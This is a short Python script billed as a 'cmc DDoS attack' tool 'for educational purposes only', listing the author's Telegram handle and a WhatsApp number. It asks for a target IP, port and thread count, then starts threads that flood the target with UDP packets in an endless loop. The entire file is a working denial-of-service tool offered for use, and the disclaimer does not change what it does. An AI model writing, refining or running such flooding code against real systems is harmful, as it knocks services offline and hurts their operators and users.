import socket
import threading


# Function to perform the attack
def dos_attack(target_ip, target_port):
    while True:
        try:
            # Create a socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Send a packet to the target
            sock.sendto(b"cmc_test_packet", (target_ip, target_port))
            print(f"Packet sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error: {e}")


# Main function
def main():
    print("\033[92m" + """
    *********************************************
    *                                           *
    *           cmc DDoS attack                  *
    *      For Educational Purposes Only        *
    *                                           *
    *       Developer: cmc                      *
    *                                           *
    *********************************************
    """ + "\033[0m")

    print("\033[94m" + "Contact Information:" + "\033[0m")
    print("Telegram: \033[96m@cmc_01\033[0m")
    print("WhatsApp: \033[96m+252617335621\033[0m")
    print("\n")

    # Get user inputs
    target_ip = input("Enter Target IP (e.g., 127.0.0.1): ")
    target_port = int(input("Enter Target Port (e.g., 80): "))
    thread_count = int(input("Enter Number of Threads (e.g., 10): "))

    print(f"\nStarting DoS attack on {target_ip}:{target_port} with {thread_count} threads...\n")

    # Start multiple threads for the attack
    for _ in range(thread_count):
        thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        thread.start()


if __name__ == "__main__":
    main()
